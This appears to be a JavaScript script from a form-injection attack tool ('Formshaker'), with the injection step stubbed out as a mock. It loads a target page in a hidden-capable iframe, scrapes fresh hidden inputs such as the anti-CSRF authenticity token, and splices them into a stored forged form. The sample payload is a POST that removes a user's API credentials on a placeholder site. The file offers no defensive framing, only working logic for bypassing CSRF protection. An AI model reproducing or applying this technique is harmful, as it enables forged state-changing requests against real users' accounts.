
    
    // ----------------------
    
    // MOCK
    function CreateTwoPayloadsFromOne_and_InjectThem(payload){
        console.log("injecting payload")
    }
    
    
    // ---------------------
    
    debug=true
    
    
    function isThereHiddenTypeInputsInPayload(payload){
        for(input of payload.inputs){
            if(input.Type == "hidden")
                return true
        }
        return false
    }
    
    
    function ProxyPayloads(payloads){
        
        //payloads = JSON.parse(payloads)

        if(payloads.length == 0)
            return 
            
        for(payload of payloads){
            var elapsed_minutes = getElapsedMinutes(payload.time);
            
            if(debug)
                console.log("Elapsed minutes between the form/payload to be injected and this moment: "+elapsed_minutes)
            
            // The hidden type inputs are updated when the elapsed time between selecting a form to inject (webpanel) and the moment when it is finally injected is shorter than 10 minutes.
            if(isThereHiddenTypeInputsInPayload(payload)){ // && elapsed_minutes < 10){
                console.log("Updating hidden parameters...")
                fetchFreshHiddenInputs_and_UpdateValues_and_InjectForms(payload)
                
            }else{
                if(debug)
                    console.log("[*] CreateTwoPayloadsFromOne_and_InjectThem without updating the hidden type inputs")
                CreateTwoPayloadsFromOne_and_InjectThem(payload)
                
            } 
        }
    }
    
    // no async or await to keep compatibility backwards
    function fetchFreshHiddenInputs_and_UpdateValues_and_InjectForms(payload){
        
        if (payload) {     
        
        
            ifrmCheck = document.getElementById(payload.identifier)
            if(ifrmCheck == null){
                var ifrm = document.createElement("iframe");
                ifrm.setAttribute("id", payload.identifier);
                ifrm.src=payload.origin
                // Para evitar redirecciones: sandbox=""
                //ifrm.setAttribute("style","width:0;height:0;border:0; border:none;")
                document.body.appendChild(ifrm);
                

                
                var func = function() { 
                    doc=ifrm.contentDocument || ifrm.contentWindow.document
                    // A link is valid so long the content type is text/html
                    var contentType = doc.contentType || doc.mimeType;
                    if (contentType.indexOf("text/html") >= 0 ){
                        
                        data = doc.body.outerHTML

                        if (typeof data==='string'){ 
                        
                        
                            hidden_inputs = getHiddenInputsByForm(data, payload.formNumberInPage)
                            var hidden_inputs_size = Object.keys(hidden_inputs).length;
                            
                            if (hidden_inputs_size > 0 ){
                                updated_payload = updateFormHiddenInputs(payload, hidden_inputs)
                                console.log(updated_payload)
                            }
                            if(debug)
                                console.log("[*] updateHiddenTypeInputs_technique and CreateTwoPayloadsFromOne_and_InjectThem")
                            CreateTwoPayloadsFromOne_and_InjectThem(payload)                                      
                        }
      
                    }else{
                        console.log("content-type no text/html")
                    }

                    ifrm.remove()
                    
                    
                };
                
                if(ifrm.addEventListener)
                    ifrm.addEventListener('load', func, true);
                else if(ifrm.attachEvent)
                    ifrm.attachEvent('onload',func);                

            }
        }
    }
    
    function getElapsedMinutes(time){
        var diff = Math.abs(new Date(decodeURIComponent(time)) - new Date());
        var minutes = Math.floor((diff/1000)/60);
        return minutes
    }
    

    function getHiddenInputsByForm(html, formNumberInPage){
        hidden_inputs={}
        parsedDocument = new DOMParser().parseFromString(html, "text/html");
        form = parsedDocument.forms[formNumberInPage]

        for (input of form.elements) {
            if(input.type == "hidden"  && !input.modified)
                hidden_inputs[input.name]=input.value
        }
        
        return hidden_inputs
        
    }    
    
    
    // this update the new hidden inputs from the payload (form to inject) with the fresh values.
    function updateFormHiddenInputs(payload, hidden_inputs){
        if(debug)
            console.log("Payload - Before: "+ payload.inputs[0].name+" : "+payload.inputs[0].value)
        
        for(input of payload.inputs){
            if(input.Type=="hidden")
                input.value=hidden_inputs[input.name]
            
        }
        if(debug)
            console.log("Payload - After: "+ payload.inputs[0].name+" : "+payload.inputs[0].value)
        
        return payload
    }
  
    
    
    
    payload1 = [{
    "origin": "https://aaaaaaaaaaa.com/www/developers/editapplication",
    "action": "https://aaaaaaaaaaa.com/www/developers/removeapicredentials",
    "method": "post",
    "outerHTML": "<form action=\"/www/developers/removeapicredentials\" method=\"post\" accept-charset=\"utf-8\" enctype=\"application/x-www-form-urlencoded\">\n<input type=\"hidden\" name=\"authenticityToken\" value=\"008f24ae8fcab6e0473a83de076b11722e75a09b\">\n <h5>Eliminar&nbsp;clave '<i>aaaaaaaaaaa</i>'?</h5> <br>\n <button type=\"submit\" class=\"btn2\">Sí,&nbsp;eliminar&nbsp;la&nbsp;clave</button>\n <input type=\"hidden\" name=\"credentialsId\" value=\"aaaaaaaaaaa\">\n \n</form>",
    "enctype": "application/x-www-form-urlencoded",
    "inputs": [
        {
            "Type": "hidden",
            "name": "authenticityToken",
            "value": "008f24ae8fcab6e0473a83de076b11722e75a09b",
            "innerText": ""
        },
        {
            "Type": "hidden",
            "name": "credentialsId",
            "value": "aaaaaaaaaaa",
            "innerText": ""
        }
    ],
    "queryForm": "authenticityToken=008f24ae8fcab6e0473a83de076b11722e75a09b&credentialsId=aaaaaaaaaaa&",
    "identifier": "1076312477Formshaker-8303",
    "base64link": "data:text/html;base64,PGNlbnRlcj48Zm9ybSBhY3Rpb249Ii93d3cvZGV2ZWxvcGVycy9yZW1vdmVhcGljcmVkZW50aWFscyIgbWV0aG9kPSJwb3N0IiBhY2NlcHQtY2hhcnNldD0idXRmLTgiIGVuY3R5cGU9ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImF1dGhlbnRpY2l0eVRva2VuIiB2YWx1ZT0iMDA4ZjI0YWU4ZmNhYjZlMDQ3M2E4M2RlMDc2YjExNzIyZTc1YTA5YiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGg1PkVsaW1pbmFyJm5ic3A7Y2xhdmUgJzxpPkhzVGNBYXJ1c2I4azhhbTJNaHN1PC9pPic/PC9oNT4gPGJyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuMiI+U8OtLCZuYnNwO2VsaW1pbmFyJm5ic3A7bGEmbmJzcDtjbGF2ZTwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNyZWRlbnRpYWxzSWQiIHZhbHVlPSJIc1RjQWFydXNiOGs4YW0yTWhzdSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCjwvZm9ybT48L2NlbnRlcj4=",
    "sessionID": "Formshaker-8303",
    "executionID": 200,
    "time": "23%20Mar%202021%2017%3A57%3A56",
    "juicy": false,
    "blacklisted": false,
    "formNumberInPage": 7
    }]
    
    
    ProxyPayloads(payload1)
    